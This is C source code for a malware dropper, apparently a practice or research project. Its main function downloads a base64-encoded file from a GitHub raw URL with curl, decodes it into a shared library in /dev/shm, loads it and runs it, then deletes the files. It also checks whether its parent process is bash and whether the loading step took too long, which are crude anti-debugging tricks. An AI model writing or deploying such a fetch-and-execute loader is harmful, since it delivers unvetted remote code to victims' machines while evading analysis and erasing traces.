#include<stdio.h>
#include <dlfcn.h>
#include<stdlib.h>
#include<fcntl.h> 
#include<time.h>
#include<string.h>
#include <unistd.h>  
   // to remove WARNINGS LIKE  warning: implicit declaration of       function ‘read’ , warning: implicit declaration of function ‘write’
void zero()
{
    int i = 0;
    int fp;
    int fp1;
    system("rm /dev/shm/kiba.so");
    system("rm /dev/shm/hmmiwonderwhatisthis");
}
int get_function_execution_stats(){
    int t;
    t = time(NULL);
    return t;
}
void myStartupFun (void) __attribute__ ((constructor)); 
void myStartupFun (void) 
{ 
    int p = getpid();
    int p2 = getppid();
    printf("%d\n",p2);
    char string[22];
    char result[5];
    int time;
    int time_end;
    FILE* fp;
    int i=0;
    //size of the string is 22
    snprintf(string, 22, "cat /proc/%d/comm", p2);
    fp = popen(string,"r");
    while(i<4){
        result[i] = fgetc(fp);
        i=i+1;
    }
    if(strcmp(result,"bash")!=0)
    {
        puts("FUCK YOU ");
    }
    result[4] = 0; 
} 
void main()
{
    int p = getpid();
    int p2 = getppid();
    printf("%d\n",p2);
    char string[22];
    char result[5];
    int time;
    int time_end;
    FILE* fp;
    int i=0;
    //size of the string is 22
    snprintf(string, 22, "cat /proc/%d/comm", p2);
    fp = popen(string,"r");
    while(i<4){
        result[i] = fgetc(fp);
        i=i+1;
    }
    if(strcmp(result,"bash")!=0)
    {
        puts("FUCK YOU ");
    }
    result[4] = 0;
    void *handle;
    void (*a)(void);
    //gcc kiba.c -shared -o /dev/shm/kiba.so
    system ("curl -s -o /dev/shm/hmmiwonderwhatisthis https://raw.githubusercontent.com/cipher1234/ASM-Dropper/main/so");
    system("cat /dev/shm/hmmiwonderwhatisthis | base64  -d > /dev/shm/kiba.so");
    time = get_function_execution_stats();
    handle = dlopen("/dev/shm/kiba.so",RTLD_LAZY);
    time_end = get_function_execution_stats();
    if(time_end-time>1)
    {
        puts("Fuck you");
        exit(0);
    }
    a = dlsym(handle,"main");
    zero();
    a();
}
